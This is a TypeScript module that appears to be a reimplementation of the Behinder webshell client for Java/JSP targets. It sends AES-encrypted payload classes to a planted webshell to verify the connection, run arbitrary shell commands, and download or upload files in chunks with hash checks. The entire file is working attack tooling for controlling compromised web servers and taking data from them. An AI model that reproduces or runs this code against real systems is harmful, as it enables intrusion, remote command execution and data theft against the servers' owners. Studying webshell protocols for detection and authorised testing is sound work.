/**
 * Behinder (冰蝎) connection test — Java/JSP protocol.
 *
 * Mirrors the Behinder client's `doConnect()`:
 *   1. inject a random string into the Echo payload class template
 *      (`Params.getParamedClass` sets the `content` field's ConstantValue)
 *   2. POST `base64(AES/ECB/PKCS5(classBytes, md5(pass)[0:16]))`
 *   3. the shell defines + runs the class; the Echo payload answers with
 *      `base64(AES({"status":b64,"msg":b64}))` — some Behinder variants answer
 *      raw AES bytes and/or append `magicNum` random trailing bytes, so the
 *      parser tries every combination and validates the JSON envelope
 *   4. connected iff status == "success" and msg echoes the random string
 */
import { CMD_CLASS_BYTES, ECHO_CLASS_BYTES, FILE_OPERATION_CLASS_BYTES } from "./assets.js";
import { injectStringConstant } from "./classfile.js";
import { aesEcbDecrypt, aesEcbEncrypt, md5Hex, md5Key16, randomString } from "./crypto.js";
import { extractCookies, postRaw } from "./http.js";
import {
  buildHeaders,
  type CommonConnectOptions,
  type ConnectTestResult,
  type DownloadResult,
  type ExecResult,
  type TransferResult,
} from "./types.js";

export interface BehinderConnectOptions extends CommonConnectOptions {
  /** Request body encoding. Default: try base64, then raw AES bytes. */
  requestEncoding?: "base64" | "raw";
}

const BASE64_RE = /^[A-Za-z0-9+/=\r\n]+$/;

interface EchoEnvelope {
  status: string;
  msg: string;
}

/** Try to turn a response body into the decrypted echo envelope. */
function parseEchoResponse(body: Buffer, key: string): EchoEnvelope | null {
  const magic = parseInt(key.slice(0, 2), 16) % 16;
  const trimmed = trimBytes(body);

  const candidates: Buffer[] = [];
  const push = (b: Buffer) => {
    if (b.length > 0 && b.length % 16 === 0 && !candidates.some((c) => c.equals(b))) {
      candidates.push(b);
    }
  };

  if (BASE64_RE.test(trimmed.toString("latin1"))) {
    let decoded: Buffer | null = null;
    try {
      decoded = Buffer.from(trimmed.toString("latin1"), "base64");
    } catch {
      decoded = null;
    }
    if (decoded) {
      push(decoded); // v3 / MemShellParty: base64(AES(json))
      if (decoded.length > magic) push(decoded.subarray(0, decoded.length - magic));
    }
  }
  if (body.length > magic) push(body.subarray(0, body.length - magic)); // raw AES + magic suffix
  push(body); // raw AES

  for (const candidate of candidates) {
    try {
      const plain = aesEcbDecrypt(candidate, key).toString("utf8");
      const obj: unknown = JSON.parse(plain);
      if (
        obj !== null &&
        typeof obj === "object" &&
        typeof (obj as Record<string, unknown>).status === "string" &&
        typeof (obj as Record<string, unknown>).msg === "string"
      ) {
        const rec = obj as { status: string; msg: string };
        return {
          status: Buffer.from(rec.status, "base64").toString("utf8"),
          msg: Buffer.from(rec.msg, "base64").toString("utf8"),
        };
      }
    } catch {
      // not the right candidate — try the next one
    }
  }
  return null;
}

function trimBytes(buf: Buffer): Buffer {
  let start = 0;
  let end = buf.length;
  const isWs = (b: number) => b === 0x20 || b === 0x09 || b === 0x0a || b === 0x0d || b === 0x00;
  while (start < end && isWs(buf[start]!)) start++;
  while (end > start && isWs(buf[end - 1]!)) end--;
  return buf.subarray(start, end);
}

function excerpt(body: Buffer): string {
  const text = body
    .toString("latin1")
    .replace(/[^\x20-\x7e]+/g, " ")
    .trim();
  return text.length > 160 ? `${text.slice(0, 160)}...` : text;
}

export async function testBehinder(
  url: string,
  pass: string,
  options: BehinderConnectOptions = {},
): Promise<ConnectTestResult> {
  const started = Date.now();
  const key = md5Key16(pass);
  const content = randomString(48 + Math.floor(Math.random() * 48));
  const classBytes = injectStringConstant(ECHO_CLASS_BYTES, "content", content);

  const encodings: Array<"base64" | "raw"> =
    options.requestEncoding === "raw"
      ? ["raw"]
      : options.requestEncoding === "base64"
        ? ["base64"]
        : ["base64", "raw"];

  const failures: string[] = [];
  for (const encoding of encodings) {
    const encrypted = aesEcbEncrypt(classBytes, key);
    const body = encoding === "base64" ? Buffer.from(encrypted.toString("base64")) : encrypted;
    let response;
    try {
      response = await postRaw(url, body, {
        headers: buildHeaders({ "Content-Type": "application/octet-stream" }, options),
        timeoutMs: options.timeoutMs,
        insecure: options.insecure,
      });
    } catch (err) {
      return {
        ok: false,
        tool: "behinder",
        url,
        error: err instanceof Error ? err.message : String(err),
        durationMs: Date.now() - started,
      };
    }

    const envelope = parseEchoResponse(response.body, key);
    if (envelope) {
      if (envelope.status === "success" && envelope.msg === content) {
        return {
          ok: true,
          tool: "behinder",
          url,
          detail: `echo verified (${content.length} random bytes, ${encoding} request, HTTP ${response.status})`,
          durationMs: Date.now() - started,
        };
      }
      failures.push(
        `${encoding}: decrypted but unexpected envelope (status=${JSON.stringify(envelope.status)})`,
      );
    } else {
      failures.push(
        `${encoding}: HTTP ${response.status}, response not a valid Behinder envelope` +
          (response.body.length > 0 ? ` (starts with: ${excerpt(response.body)})` : " (empty body)"),
      );
    }
  }

  return {
    ok: false,
    tool: "behinder",
    url,
    error: failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
    durationMs: Date.now() - started,
  };
}

/**
 * Behinder command execution — uploads the `Cmd` payload class with its
 * static `cmd` field filled in (same `Params.getParamedClass` mechanism as
 * the Echo payload). The payload picks `cmd.exe /c` or `/bin/sh -c` itself
 * based on `os.name`, so no OS detection is needed here.
 * The response is the usual Behinder envelope: base64(AES({status, msg})),
 * where `msg` is the base64-encoded command output (stdout then stderr).
 */
export async function execBehinder(
  url: string,
  pass: string,
  command: string,
  options: BehinderConnectOptions = {},
): Promise<ExecResult> {
  const started = Date.now();
  const key = md5Key16(pass);
  const classBytes = injectStringConstant(CMD_CLASS_BYTES, "cmd", command);

  const fail = (error: string): ExecResult => ({
    ok: false,
    tool: "behinder",
    url,
    command,
    error,
    durationMs: Date.now() - started,
  });

  const encodings: Array<"base64" | "raw"> =
    options.requestEncoding === "raw"
      ? ["raw"]
      : options.requestEncoding === "base64"
        ? ["base64"]
        : ["base64", "raw"];

  const failures: string[] = [];
  for (const encoding of encodings) {
    const encrypted = aesEcbEncrypt(classBytes, key);
    const body = encoding === "base64" ? Buffer.from(encrypted.toString("base64")) : encrypted;
    let response;
    try {
      response = await postRaw(url, body, {
        headers: buildHeaders({ "Content-Type": "application/octet-stream" }, options),
        timeoutMs: options.timeoutMs,
        insecure: options.insecure,
      });
    } catch (err) {
      return fail(err instanceof Error ? err.message : String(err));
    }

    const envelope = parseEchoResponse(response.body, key);
    if (envelope) {
      if (envelope.status === "success") {
        return {
          ok: true,
          tool: "behinder",
          url,
          command,
          output: envelope.msg,
          durationMs: Date.now() - started,
        };
      }
      // the payload executed but reported failure — its msg says why
      return fail(`remote status "fail": ${envelope.msg}`);
    }
    failures.push(
      `${encoding}: HTTP ${response.status}, response not a valid Behinder envelope` +
        (response.body.length > 0 ? ` (starts with: ${excerpt(response.body)})` : " (empty body)"),
    );
  }

  return fail(
    failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
  );
}

/* ------------------------------------------------------------------------ *
 * File transfer (FileOperation payload)
 *
 * Behinder v4.1's FileOperation class is uploaded like the Cmd payload, with
 * static String fields filled client-side (mode/path/content/blockIndex/
 * blockSize). Protocol choices, matching the official client:
 *
 * - upload: mode=create for the first chunk (truncate + write), mode=append
 *   for the rest — sequential and session-independent. The `update` mode the
 *   GUI uses is NOT safe here: it caches a FileChannel in the http session
 *   and falls back to a *truncating* FileOutputStream per request without a
 *   session cookie, corrupting multi-chunk uploads when the shell gives us
 *   no session.
 * - download: mode=downloadPart (absolute blockIndex*blockSize positioning,
 *   read-only, safe without a session). mode=download is broken in the
 *   payload (reflection type mismatch) and never used by the GUI either.
 * - size probe: mode=checkExist returns the decimal file size.
 * - integrity: mode=check returns the remote MD5 hex [0:16] and closes any
 *   session-cached channels. It NPEs on empty files (null msg in buildJson),
 *   so empty transfers verify via checkExist instead.
 * - downloadPart's msg is base64 TWICE (payload base64s the chunk, buildJson
 *   base64s every value again) — parseEchoResponse strips one layer.
 * ------------------------------------------------------------------------ */

/** Raw upload block: base64 -> 61440 chars, under the 65535 constant-pool UTF8 limit. */
const BH_UPLOAD_CHUNK = 46080;
/** Download block, same as the official client (0x100000). */
const BH_DOWNLOAD_CHUNK = 1024 * 1024;
/** Whole-file downloads are buffered in memory — refuse absurd sizes. */
const BH_MAX_DOWNLOAD = 0x7fffffff; // 2 GiB
/** Download chunks are idempotent (read-only, absolute position) — safe to retry. */
const BH_CHUNK_ATTEMPTS = 3;
/**
 * The payload's `check` reads the whole remote file byte-by-byte to MD5 it
 * (getFileData) — minutes and gigabytes of heap for big files. Above this
 * size verify with a cheap checkExist size comparison instead.
 */
const BH_HASH_CHECK_LIMIT = 128 * 1024 * 1024;

interface BehinderChannel {
  /** Upload the FileOperation class with `fields` filled; resolve the envelope. */
  invoke(fields: Record<string, string>): Promise<EchoEnvelope>;
}

/**
 * A Behinder request channel: reuses the working request encoding (base64 vs
 * raw AES) once discovered instead of retrying both per chunk, and relays
 * any session cookie the shell hands out (lets the payload cache its file
 * channel, and lets `check` close it afterwards).
 */
function openBehinderChannel(
  url: string,
  key: string,
  options: BehinderConnectOptions = {},
): BehinderChannel {
  let pinned: "base64" | "raw" | null = options.requestEncoding ?? null;
  let cookie: string | undefined;

  const invoke = async (fields: Record<string, string>): Promise<EchoEnvelope> => {
    let classBytes: Buffer = FILE_OPERATION_CLASS_BYTES;
    for (const [name, value] of Object.entries(fields)) {
      classBytes = injectStringConstant(classBytes, name, value);
    }
    const encrypted = aesEcbEncrypt(classBytes, key);
    const encodings: Array<"base64" | "raw"> = pinned ? [pinned] : ["base64", "raw"];

    const failures: string[] = [];
    for (const encoding of encodings) {
      const body = encoding === "base64" ? Buffer.from(encrypted.toString("base64")) : encrypted;
      const baseHeaders = buildHeaders({ "Content-Type": "application/octet-stream" }, options);
      const response = await postRaw(url, body, {
        headers: cookie ? { ...baseHeaders, Cookie: cookie } : baseHeaders,
        timeoutMs: options.timeoutMs,
        insecure: options.insecure,
      });
      const setCookies = extractCookies(response.headers);
      if (setCookies.length > 0) cookie = setCookies.join("; ");

      const envelope = parseEchoResponse(response.body, key);
      if (envelope) {
        pinned = encoding;
        return envelope;
      }
      failures.push(
        `${encoding}: HTTP ${response.status}, response not a valid Behinder envelope` +
          (response.body.length > 0 ? ` (starts with: ${excerpt(response.body)})` : " (empty body)"),
      );
    }
    throw new Error(
      failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
    );
  };

  return { invoke };
}

export interface BehinderTransferOptions extends BehinderConnectOptions {
  /** Override the download chunk size (tests use tiny chunks). */
  downloadChunkSize?: number;
  /** Override the MD5-vs-size verification threshold (tests use tiny values). */
  hashCheckLimit?: number;
}

interface RemoteVerification {
  error?: string;
  detail?: string;
}

/**
 * Post-transfer integrity check. Small files: `check` returns the remote
 * MD5 hex [0:16] (and closes any session-cached stream) — compare against
 * the local bytes. Above `limit`: the payload's check would read the whole
 * remote file byte-by-byte, so fall back to a checkExist size comparison
 * and say so in the detail.
 */
async function verifyBehinderRemote(
  channel: BehinderChannel,
  remotePath: string,
  data: Buffer,
  limit: number,
  mismatchNote: string,
): Promise<RemoteVerification> {
  if (data.length > limit) {
    try {
      const envelope = await channel.invoke({ mode: "checkExist", path: remotePath });
      const text = envelope.status === "success" ? envelope.msg.trim() : "";
      if (!/^\d+$/.test(text) || Number.parseInt(text, 10) !== data.length) {
        return {
          error:
            `size verification failed — local ${data.length} bytes, ` +
            `remote said ${JSON.stringify(envelope.msg)}`,
        };
      }
      return { detail: `over ${limit} bytes — MD5 check skipped, size verified` };
    } catch (err) {
      return {
        detail: `size verification unavailable (${err instanceof Error ? err.message : String(err)})`,
      };
    }
  }

  try {
    const envelope = await channel.invoke({ mode: "check", path: remotePath });
    if (envelope.status === "success" && /^[0-9a-fA-F]{16}$/.test(envelope.msg.trim())) {
      const local = md5Hex(data).slice(0, 16).toLowerCase();
      if (envelope.msg.trim().toLowerCase() !== local) {
        return {
          error: `hash mismatch — remote md5[0:16]=${envelope.msg.trim()}, local=${local} ${mismatchNote}`,
        };
      }
      return {};
    }
    return { detail: "hash verification unavailable (unexpected check response)" };
  } catch {
    return { detail: "hash verification unavailable (check request failed)" };
  }
}

/**
 * Behinder file download — checkExist for the size, downloadPart chunks,
 * then `check` for an MD5[0:16] comparison against the received bytes.
 */
export async function downloadBehinder(
  url: string,
  pass: string,
  remotePath: string,
  options: BehinderTransferOptions = {},
): Promise<DownloadResult> {
  const started = Date.now();
  const key = md5Key16(pass);
  const fail = (error: string): DownloadResult => ({
    ok: false,
    tool: "behinder",
    url,
    direction: "download",
    remotePath,
    error,
    durationMs: Date.now() - started,
  });

  const channel = openBehinderChannel(url, key, options);

  // ---- size probe ----
  let size: number;
  try {
    const envelope = await channel.invoke({ mode: "checkExist", path: remotePath });
    if (envelope.status !== "success") {
      return fail(
        `remote path not found (or not readable): ${remotePath}` +
          (envelope.msg ? ` — ${envelope.msg}` : ""),
      );
    }
    const text = envelope.msg.trim();
    if (!/^\d+$/.test(text)) {
      return fail(`unexpected checkExist response: ${JSON.stringify(envelope.msg)}`);
    }
    size = Number.parseInt(text, 10);
  } catch (err) {
    return fail(err instanceof Error ? err.message : String(err));
  }
  if (size > BH_MAX_DOWNLOAD) {
    return fail(`remote file is ${size} bytes — refusing to buffer over 2 GiB in memory`);
  }

  // ---- chunked read (empty file: no chunks at all) ----
  const chunkSize = options.downloadChunkSize ?? BH_DOWNLOAD_CHUNK;
  const parts: Buffer[] = [];
  let downloaded = 0;
  const blockCount = Math.ceil(size / chunkSize);
  for (let index = 0; index < blockCount; index++) {
    const want = Math.min(chunkSize, size - downloaded);
    let chunk: Buffer | null = null;
    let serverSays = "";
    for (let attempt = 1; attempt <= BH_CHUNK_ATTEMPTS && chunk === null; attempt++) {
      try {
        const envelope = await channel.invoke({
          mode: "downloadPart",
          path: remotePath,
          blockIndex: String(index),
          blockSize: String(chunkSize),
        });
        if (envelope.status !== "success") {
          // e.g. the file shrank mid-transfer (EOF read -> status fail)
          serverSays = envelope.msg || "remote status fail";
          continue;
        }
        const buf = Buffer.from(envelope.msg, "base64");
        if (buf.length !== want) {
          serverSays = `short chunk: got ${buf.length} of ${want} bytes`;
          continue;
        }
        chunk = buf;
      } catch (err) {
        serverSays = err instanceof Error ? err.message : String(err);
      }
    }
    if (chunk === null) {
      return fail(`chunk ${index} at offset ${downloaded}/${size} failed — ${serverSays}`);
    }
    parts.push(chunk);
    downloaded += chunk.length;
  }
  const data = Buffer.concat(parts);

  // ---- integrity check (MD5, or size above the limit) ----
  // Empty files make the payload's check NPE (null msg) — nothing to hash anyway.
  let detail: string | undefined;
  if (size === 0) {
    detail = "remote file is empty — hash check skipped";
  } else {
    const verification = await verifyBehinderRemote(
      channel,
      remotePath,
      data,
      options.hashCheckLimit ?? BH_HASH_CHECK_LIMIT,
      "(the file changed during transfer?)",
    );
    if (verification.error) return fail(verification.error);
    detail = verification.detail;
  }

  return {
    ok: true,
    tool: "behinder",
    url,
    direction: "download",
    remotePath,
    bytes: data.length,
    detail,
    data,
    durationMs: Date.now() - started,
  };
}

/**
 * Behinder file upload — first chunk mode=create (truncate + write), the rest
 * mode=append, then `check` for an MD5[0:16] comparison. Append is not
 * idempotent, so a failed chunk aborts immediately (the error says the
 * remote file may be partial) instead of risking duplicated content.
 */
export async function uploadBehinder(
  url: string,
  pass: string,
  remotePath: string,
  data: Buffer,
  options: BehinderTransferOptions = {},
): Promise<TransferResult> {
  const started = Date.now();
  const key = md5Key16(pass);
  const fail = (error: string): TransferResult => ({
    ok: false,
    tool: "behinder",
    url,
    direction: "upload",
    remotePath,
    error,
    durationMs: Date.now() - started,
  });

  const channel = openBehinderChannel(url, key, options);

  if (data.length === 0) {
    // create truncates; an empty content field produces an empty remote file.
    try {
      const envelope = await channel.invoke({ mode: "create", path: remotePath, content: "" });
      if (envelope.status !== "success") {
        return fail(`server said: ${envelope.msg || "remote status fail"}`);
      }
    } catch (err) {
      return fail(err instanceof Error ? err.message : String(err));
    }
    return {
      ok: true,
      tool: "behinder",
      url,
      direction: "upload",
      remotePath,
      bytes: 0,
      detail: "empty file — hash check skipped",
      durationMs: Date.now() - started,
    };
  }

  let offset = 0;
  let index = 0;
  while (offset < data.length) {
    const chunk = data.subarray(offset, Math.min(offset + BH_UPLOAD_CHUNK, data.length));
    const mode = index === 0 ? "create" : "append";
    try {
      const envelope = await channel.invoke({
        mode,
        path: remotePath,
        content: chunk.toString("base64"),
      });
      if (envelope.status !== "success") {
        return fail(
          `chunk ${index} failed at offset ${offset}/${data.length} — server said: ` +
            `${envelope.msg || "remote status fail"} — the remote file may be incomplete`,
        );
      }
    } catch (err) {
      return fail(
        `chunk ${index} failed at offset ${offset}/${data.length}: ` +
          `${err instanceof Error ? err.message : String(err)} — the remote file may be incomplete`,
      );
    }
    offset += chunk.length;
    index++;
  }

  // ---- integrity check (MD5, or size above the limit) ----
  const verification = await verifyBehinderRemote(
    channel,
    remotePath,
    data,
    options.hashCheckLimit ?? BH_HASH_CHECK_LIMIT,
    "(the upload was corrupted)",
  );
  if (verification.error) return fail(verification.error);

  return {
    ok: true,
    tool: "behinder",
    url,
    direction: "upload",
    remotePath,
    bytes: data.length,
    detail: verification.detail,
    durationMs: Date.now() - started,
  };
}
